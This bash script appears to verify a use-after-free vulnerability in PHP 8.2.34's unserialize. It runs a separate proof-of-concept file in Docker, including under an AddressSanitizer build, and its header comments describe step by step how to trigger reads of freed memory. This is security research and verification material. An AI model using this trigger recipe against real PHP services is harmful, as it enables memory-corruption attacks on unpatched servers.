#!/usr/bin/env bash
# Chain B — var_destroy __destruct reentry UAF (PHP 8.2.34).
#
# Mechanism under test:
#   1. array with > VAR_ENTRIES_MAX (1024) entries -> var_hash extension chunks
#   2. duplicate array key -> the object is pushed onto the deferred-dtor chain
#   3. var_destroy() phase 1 efree()s the extension chunks, then phase 2 fires
#      __destruct WITHOUT BG(serialize_lock)
#   4. the destructor's unserialize('R:1500;') shares the OUTER (freed) var_hash
#      -> use-after-free read
#
# A fresh unserialize() has an empty var_hash: R:1500 MUST return false.
# Anything else = read from freed memory of the outer parse.
#
# Stage [3] builds PHP 8.2.34 from source with AddressSanitizer
# (~10 min first run, cached afterwards).
set -uo pipefail
BASE="$(cd "$(dirname "$0")" && pwd)"
POC="$BASE/chainb/poc_uaf.php"
IMG=php-asan-verify

echo "=== Chain B — var_destroy __destruct reentry UAF ==="
echo

echo "[1/3] behavioral — stock ZendMM (freed chunks likely intact, value readable)"
docker run --rm -v "$BASE/chainb":/poc php:8.2.34-cli php /poc/poc_uaf.php
echo

echo "[2/3] behavioral — malloc-backed (USE_ZEND_ALLOC=0)"
docker run --rm -e USE_ZEND_ALLOC=0 -v "$BASE/chainb":/poc php:8.2.34-cli php /poc/poc_uaf.php
echo

echo "[3/3] definitive — AddressSanitizer build of PHP 8.2.34"
if ! docker image inspect "$IMG" >/dev/null 2>&1; then
  echo "      building ASAN php (first run only, ~10 min)..."
  docker build -q -f "$BASE/chainb/Dockerfile.asan" -t "$IMG" "$BASE/chainb" >/dev/null \
    || { echo "[-] ASAN build failed"; exit 1; }
fi
OUT=$(docker run --rm -e USE_ZEND_ALLOC=0 -e ASAN_OPTIONS=detect_leaks=0 \
  -v "$BASE/chainb":/poc "$IMG" \
  bash -c '/tmp/php-src/sapi/cli/php /poc/poc_uaf.php 2>&1')
echo "$OUT" | grep -E "\[\*\]|\[\+\]|\[-\]|ERROR: AddressSanitizer|READ of size|freed by|var_destroy|var_unserializer.c|SUMMARY" | head -15

if echo "$OUT" | grep -q "heap-use-after-free"; then
  echo
  echo "[+] CONFIRMED: heap-use-after-free — READ in php_var_unserialize, memory freed by var_destroy"
  exit 0
fi
echo "[-] ASAN did not report a use-after-free"
exit 1
